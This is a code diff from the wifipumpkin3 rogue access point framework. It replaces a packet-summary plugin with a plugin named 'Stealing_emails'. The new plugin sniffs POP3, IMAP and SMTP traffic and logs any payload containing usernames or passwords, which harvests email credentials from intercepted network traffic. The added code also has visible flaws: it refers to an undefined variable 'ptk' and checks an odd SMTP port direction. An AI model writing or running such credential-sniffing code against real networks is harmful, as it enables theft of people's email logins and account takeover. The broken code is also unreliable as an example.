@@ -1,6 +1,5 @@
 from scapy.all import *
-from wifipumpkin3.plugins.analyzers.default import PSniffer
-from dns import resolver
+from wifipumpkin3.plugins.sniffkin3.default import PSniffer
 
 # This file is part of the wifipumpkin3 Open Source Project.
 # wifipumpkin3 is licensed under the Apache 2.0.
@@ -20,13 +19,15 @@ from dns import resolver
 # limitations under the License.
 
 
-class Summary(PSniffer):
+class Stealing_emails(PSniffer):
+    """ capture POP3,IMAP,SMTP """
+
     _activated = False
     _instance = None
     meta = {
-        "Name": "summary",
+        "Name": "emails",
         "Version": "1.0",
-        "Description": "quick look at the packet is layers: ",
+        "Description": "capture emails packets POP3,IMAP,SMTP ",
         "Author": "Pumpkin-Dev",
     }
 
@@ -36,18 +37,17 @@ class Summary(PSniffer):
 
     @staticmethod
     def getInstance():
-        if Summary._instance is None:
-            Summary._instance = Summary()
-        return Summary._instance
+        if Stealing_emails._instance is None:
+            Stealing_emails._instance = Stealing_emails()
+        return Stealing_emails._instance
 
     def filterPackets(self, pkt):
-        if (
-            pkt.haslayer(Ether)
-            and pkt.haslayer(Raw)
-            and not pkt.haslayer(IP)
-            and not pkt.haslayer(IPv6)
-        ):
-            return
-        # if pkt.haslayer(DNSQR):
-        #    print ('{} ->() has searched for: {}'.format(pkt[IP].src, pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname)) - 1]))
-        # return self.output.emit({'{}'.format(self.meta['Name']): "Packet : %s ==> %s" % (pkt[0][1].src, pkt[0][1].dst)})
+        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
+            self.dport = pkt[TCP].dport
+            self.sport = pkt[TCP].sport
+            if self.dport == 110 or self.sport == 25 or self.dport == 143:
+                if ptk[TCP].payload:
+                    email_pkt = str(ptk[TCP].payload)
+                    if "user" in email_pkt.lower() or "pass" in email_pkt.lower():
+                        self.logging.info("[*] Server {}".format(pkt[IP].dst))
+                        self.logging.info("[*] {}".format(pkt[TCP].payload))
